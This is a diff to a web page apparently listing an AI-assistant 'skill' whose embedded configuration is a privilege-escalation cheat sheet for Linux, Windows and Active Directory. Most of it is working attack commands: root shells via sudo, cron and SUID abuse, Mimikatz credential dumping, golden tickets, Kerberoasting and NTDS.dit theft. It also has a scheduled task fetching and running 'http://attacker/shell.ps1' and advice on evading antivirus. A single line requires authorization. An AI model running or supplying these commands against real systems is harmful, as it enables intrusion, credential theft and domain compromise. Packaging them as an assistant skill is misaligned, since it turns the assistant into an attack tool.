@@ -33,20 +33,15 @@
     .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
     .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
     .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
-    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
-    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
-    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .copy-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .copy-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
     .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
     .copy-btn:hover{background:#f5f5f5}
     pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
-    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
-    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
-    .how-to ol{margin:16px 0;padding-left:24px}
-    .how-to li{margin-bottom:12px;color:#444}
-    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
     .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
     .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
-    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
+    @media(max-width:768px){.header{flex-direction:column}.copy-box code{font-size:12px}}
   </style>
 </head>
 <body>
@@ -83,18 +78,350 @@
     <p class="desc">This skill should be used when the user asks to "escalate privileges", "get root access", "become administrator", "privesc techniques", "abuse sudo", "exploit SUID binaries", "Kerberoasting", "pass-the-ticket", "token impersonation", or needs guidance on post-exploitation privilege escalation for Linux or Windows systems.</p>
 
     <div class="section">
-      <h2>How to Use</h2>
-      <div class="how-to">
-        <ol>
-          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/privilege-escalation-methods</code> in your terminal</li>
-          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
-        </ol>
-        
-        <div class="install-box">
-          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
-          <p>Installation Command:</p>
-          <code id="install-cmd">npx aiccli install skills/privilege-escalation-methods</code>
-        </div>
+      <h2>How to Install</h2>
+      <ol style="margin:16px 0;padding-left:24px;color:#444">
+        <li style="margin-bottom:12px"><strong>Copy the config</strong> - Click the "Copy Config" button below</li>
+        <li style="margin-bottom:12px"><strong>Add to your project</strong> - Paste the code into the appropriate config file</li>
+        <li style="margin-bottom:12px"><strong>Done!</strong> - The component is now available in your AI</li>
+      </ol>
+      
+      <div class="copy-box">
+        <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+        <p>Configuration (click to copy):</p>
+        <code id="install-cmd">---
+name: Privilege Escalation Methods
+description: This skill should be used when the user asks to &quot;escalate privileges&quot;, &quot;get root access&quot;, &quot;become administrator&quot;, &quot;privesc techniques&quot;, &quot;abuse sudo&quot;, &quot;exploit SUID binaries&quot;, &quot;Kerberoasting&quot;, &quot;pass-the-ticket&quot;, &quot;token impersonation&quot;, or needs guidance on post-exploitation privilege escalation for Linux or Windows systems.
+metadata:
+  author: zebbern
+  version: &quot;1.1&quot;
+---
+
+# Privilege Escalation Methods
+
+## Purpose
+
+Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations.
+
+## Inputs/Prerequisites
+
+- Initial low-privilege shell access on target system
+- Kali Linux or penetration testing distribution
+- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus
+- Understanding of Windows/Linux privilege models
+- For AD attacks: Domain user credentials and network access to DC
+
+## Outputs/Deliverables
+
+- Root or Administrator shell access
+- Extracted credentials and hashes
+- Persistent access mechanisms
+- Domain compromise (for AD environments)
+
+---
+
+## Core Techniques
+
+### Linux Privilege Escalation
+
+#### 1. Abusing Sudo Binaries
+
+Exploit misconfigured sudo permissions using GTFOBins techniques:
+
+```bash
+# Check sudo permissions
+sudo -l
+
+# Exploit common binaries
+sudo vim -c &#039;:!/bin/bash&#039;
+sudo find /etc/passwd -exec /bin/bash \;
+sudo awk &#039;BEGIN {system(&quot;/bin/bash&quot;)}&#039;
+sudo python -c &#039;import pty;pty.spawn(&quot;/bin/bash&quot;)&#039;
+sudo perl -e &#039;exec &quot;/bin/bash&quot;;&#039;
+sudo less /etc/hosts    # then type: !bash
+sudo man man            # then type: !bash
+sudo env /bin/bash
+```
+
+#### 2. Abusing Scheduled Tasks (Cron)
+
+```bash
+# Find writable cron scripts
+ls -la /etc/cron*
+cat /etc/crontab
+
+# Inject payload into writable script
+echo &#039;chmod +s /bin/bash&#039; &gt; /home/user/systemupdate.sh
+chmod +x /home/user/systemupdate.sh
+
+# Wait for execution, then:
+/bin/bash -p
+```
+
+#### 3. Abusing Capabilities
+
+```bash
+# Find binaries with capabilities
+getcap -r / 2&gt;/dev/null
+
+# Python with cap_setuid
+/usr/bin/python2.6 -c &#039;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#039;
+
+# Perl with cap_setuid
+/usr/bin/perl -e &#039;use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#039;
+
+# Tar with cap_dac_read_search (read any file)
+/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
+/usr/bin/tar -xvf key.tar
+```
+
+#### 4. NFS Root Squashing
+
+```bash
+# Check for NFS shares
+showmount -e &lt;victim_ip&gt;
+
+# Mount and exploit no_root_squash
+mkdir /tmp/mount
+mount -o rw,vers=2 &lt;victim_ip&gt;:/tmp /tmp/mount
+cd /tmp/mount
+cp /bin/bash .
+chmod +s bash
+```
+
+#### 5. MySQL Running as Root
+
+```bash
+# If MySQL runs as root
+mysql -u root -p
+\! chmod +s /bin/bash
+exit
+/bin/bash -p
+```
+
+---
+
+### Windows Privilege Escalation
+
+#### 1. Token Impersonation
+
+```powershell
+# Using SweetPotato (SeImpersonatePrivilege)
+execute-assembly sweetpotato.exe -p beacon.exe
+
+# Using SharpImpersonation
+SharpImpersonation.exe user:&lt;user&gt; technique:ImpersonateLoggedOnuser
+```
+
+#### 2. Service Abuse
+
+```powershell
+# Using PowerUp
+. .\PowerUp.ps1
+Invoke-ServiceAbuse -Name &#039;vds&#039; -UserName &#039;domain\user1&#039;
+Invoke-ServiceAbuse -Name &#039;browser&#039; -UserName &#039;domain\user1&#039;
+```
+
+#### 3. Abusing SeBackupPrivilege
+
+```powershell
+import-module .\SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
+```
+
+#### 4. Abusing SeLoadDriverPrivilege
+
+```powershell
+# Load vulnerable Capcom driver
+.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
+.\ExploitCapcom.exe
+```
+
+#### 5. Abusing GPO
+
+```powershell
+.\SharpGPOAbuse.exe --AddComputerTask --Taskname &quot;Update&quot; `
+  --Author DOMAIN\&lt;USER&gt; --Command &quot;cmd.exe&quot; `
+  --Arguments &quot;/c net user Administrator Password!@# /domain&quot; `
+  --GPOName &quot;ADDITIONAL DC CONFIGURATION&quot;
+```
+
+---
+
+### Active Directory Attacks
+
+#### 1. Kerberoasting
+
+```bash
+# Using Impacket
+GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request
+
+# Using CrackMapExec
+crackmapexec ldap 10.0.2.11 -u &#039;user&#039; -p &#039;pass&#039; --kdcHost 10.0.2.11 --kerberoast output.txt
+```
+
+#### 2. AS-REP Roasting
+
+```powershell
+.\Rubeus.exe asreproast
+```
+
+#### 3. Golden Ticket
+
+```powershell
+# DCSync to get krbtgt hash
+mimikatz# lsadump::dcsync /user:krbtgt
+
+# Create golden ticket
+mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
+  /sid:S-1-5-21-... /rc4:&lt;NTLM_HASH&gt; /id:500
+```
+
+#### 4. Pass-the-Ticket
+
+```powershell
+.\Rubeus.exe asktgt /user:USER$ /rc4:&lt;NTLM_HASH&gt; /ptt
+klist  # Verify ticket
+```
+
+#### 5. Golden Ticket with Scheduled Tasks
+
+```powershell
+# 1. Elevate and dump credentials
+mimikatz# token::elevate
+mimikatz# vault::cred /patch
+mimikatz# lsadump::lsa /patch
+
+# 2. Create golden ticket
+mimikatz# kerberos::golden /user:Administrator /rc4:&lt;HASH&gt; `
+  /domain:DOMAIN /sid:&lt;SID&gt; /ticket:ticket.kirbi
+
+# 3. Create scheduled task
+schtasks /create /S DOMAIN /SC Weekly /RU &quot;NT Authority\SYSTEM&quot; `
+  /TN &quot;enterprise&quot; /TR &quot;powershell.exe -c &#039;iex (iwr http://attacker/shell.ps1)&#039;&quot;
+schtasks /run /s DOMAIN /TN &quot;enterprise&quot;
+```
+
+---
+
+### Credential Harvesting
+
+#### LLMNR Poisoning
+
+```bash
+# Start Responder
+responder -I eth1 -v
+
+# Create malicious shortcut (Book.url)
+[InternetShortcut]
+URL=https://facebook.com
+IconIndex=0
+IconFile=\\attacker_ip\not_found.ico
+```
+
+#### NTLM Relay
+
+```bash
+responder -I eth1 -v
+ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+#### Dumping with VSS
+
+```powershell
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
+```
+
+---
+
+## Quick Reference
+
+| Technique | OS | Domain Required | Tool |
+|-----------|-----|-----------------|------|
+| Sudo Binary Abuse | Linux | No | GTFOBins |
+| Cron Job Exploit | Linux | No | Manual |
+| Capability Abuse | Linux | No | getcap |
+| NFS no_root_squash | Linux | No | mount |
+| Token Impersonation | Windows | No | SweetPotato |
+| Service Abuse | Windows | No | PowerUp |
+| Kerberoasting | Windows | Yes | Rubeus/Impacket |
+| AS-REP Roasting | Windows | Yes | Rubeus |
+| Golden Ticket | Windows | Yes | Mimikatz |
+| Pass-the-Ticket | Windows | Yes | Rubeus |
+| DCSync | Windows | Yes | Mimikatz |
+| LLMNR Poisoning | Windows | Yes | Responder |
+
+---
+
+## Constraints
+
+**Must:**
+- Have initial shell access before attempting escalation
+- Verify target OS and environment before selecting technique
+- Use appropriate tool for domain vs local escalation
+
+**Must Not:**
+- Attempt techniques on production systems without authorization
+- Leave persistence mechanisms without client approval
+- Ignore detection mechanisms (EDR, SIEM)
+
+**Should:**
+- Enumerate thoroughly before exploitation
+- Document all successful escalation paths
+- Clean up artifacts after engagement
+
+---
+
+## Examples
+
+### Example 1: Linux Sudo to Root
+
+```bash
+# Check sudo permissions
+$ sudo -l
+User www-data may run the following commands:
+    (root) NOPASSWD: /usr/bin/vim
+
+# Exploit vim
+$ sudo vim -c &#039;:!/bin/bash&#039;
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Example 2: Windows Kerberoasting
+
+```bash
+# Request service tickets
+$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request
+
+# Crack with hashcat
+$ hashcat -m 13100 hashes.txt rockyou.txt
+```
+
+---
+
+## Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |
+| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
+| Kerberoasting returns no hashes | Check for service accounts with SPNs |
+| Token impersonation fails | Verify SeImpersonatePrivilege is present |
+| NFS mount fails | Check NFS version compatibility (vers=2,3,4) |
+
+---
+
+## Additional Resources
+
+For detailed enumeration scripts, use:
+- **LinPEAS**: Linux privilege escalation enumeration
+- **WinPEAS**: Windows privilege escalation enumeration
+- **BloodHound**: Active Directory attack path mapping
+- **GTFOBins**: Unix binary exploitation reference
+</code>
       </div>
     </div>
 
